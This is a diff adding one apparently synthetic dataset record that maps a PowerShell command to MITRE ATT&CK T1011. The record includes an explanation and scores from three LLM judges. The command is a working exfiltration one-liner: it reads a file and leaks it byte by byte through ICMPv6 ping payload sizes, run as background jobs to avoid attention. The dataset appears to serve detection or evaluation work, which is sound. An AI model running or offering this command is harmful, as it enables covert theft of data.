@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
+  "explanation": "Backgrounds ICMPv6 transmissions that encode bytes in payload size, reducing interactive artifacts while exfiltrating over ICMPv6 consistent with T1011.",
+  "rationale_steps": [
+    "Read file bytes.",
+    "Offset and embed each byte in ICMPv6 payload size.",
+    "Run pings as background jobs to minimize console output and attention."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-131755df",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes/parentheses, correct separators, and legitimate Test-Connection parameters.",
+        "semantic_score": 2,
+        "semantic_justification": "Although it plausibly encodes bytes into ICMPv6 echo payload sizes, this aligns with exfiltration over alternative protocol (ICMP) rather than T1011’s ‘other network medium’ (e.g., cellular/Wi‑Fi/Bluetooth), and spawning a job per byte is operationally dubious.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T00:41:36.774643Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignment, pipeline operators, and valid PowerShell cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements T1011 by reading a file and exfiltrating its contents byte-by-byte over ICMPv6 (a different network medium than typical C2) by encoding each byte in the ICMP packet size and running as background jobs to avoid detection.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:41:40.112376Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignment, .NET method calls, piping, cmdlets, and their parameters, with no errors or ambiguities.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by reading file bytes and encoding them as ICMPv6 payload sizes, sending them asynchronously to a link-local address, fully aligning with the T1011 technique of exfiltration over an alternative network medium.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T00:41:52.815432Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
